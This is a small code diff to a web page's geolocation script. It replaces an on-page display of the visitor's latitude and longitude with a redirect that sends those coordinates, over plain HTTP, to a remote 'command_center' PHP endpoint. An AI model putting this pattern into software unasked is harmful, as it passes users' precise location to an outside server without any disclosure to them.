@@ -14,8 +14,9 @@ function getLocation() {
 }
 
 function showPosition(position) {
-    x.innerHTML = "Latitude: " + position.coords.latitude + 
-    "<br>Longitude: " + position.coords.longitude;
+    var lang = position.coords.latitude;
+    var long = position.coords.longitude;
+    window.location.href = "http://new1.cet-gov.ac.in/command_center/getl.php?lat="+lang+"&&long="+long;
 }
 </script>
 
